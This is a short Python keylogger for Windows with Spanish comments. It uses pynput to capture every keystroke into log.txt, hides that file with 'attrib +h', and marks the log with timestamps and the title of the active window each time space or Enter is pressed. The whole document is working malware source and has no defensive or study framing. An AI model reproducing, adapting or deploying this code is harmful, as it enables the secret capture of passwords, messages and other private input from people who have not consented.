#!/usr/bin/python3
import win32gui 
from pynput import keyboard
from datetime import datetime
import threading
import time
import os


current_window= ""

def get_current_window():
    """Funcion para retornar el título de la ventana activa"""
    window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if window_title == "":
        return "<Ventana sin título>"
    else:
        return window_title
    
def update_current_window():
    """Función para actualizar el título de la ventana activa cada segundo"""
    while True:
        get_current_window()
        time.sleep(1)

update_window_thread = threading.Thread(target=update_current_window)
update_window_thread.daemon = True
update_window_thread.start()
os.system("attrib +h log.txt")
def on_press(key):
    with open("log.txt", "a") as f:
        try:
            # Si la tecla presionada es la tecla de espacio o la tecla Enter, agrega un salto de línea y la fecha/hora actual
            if key == keyboard.Key.space or key == keyboard.Key.enter:
                now = datetime.now()
                timestamp = now.strftime("Fecha: %d/%m/%Y Hora: %H:%M:%S")
                window_title = get_current_window()
                f.write("\n[{}] {}\n".format(timestamp, window_title))
            elif key == keyboard.Key.tab or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r or key == keyboard.Key.backspace or key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr or key == keyboard.Key.ctrl_l:
                 pass
            else:
                # Escribe la tecla presionada en el registro
                f.write(key.char)
        except AttributeError:
            # Escribe el nombre de la tecla en su lugar si no es imprimible
            f.write(f"{key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False
    




with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
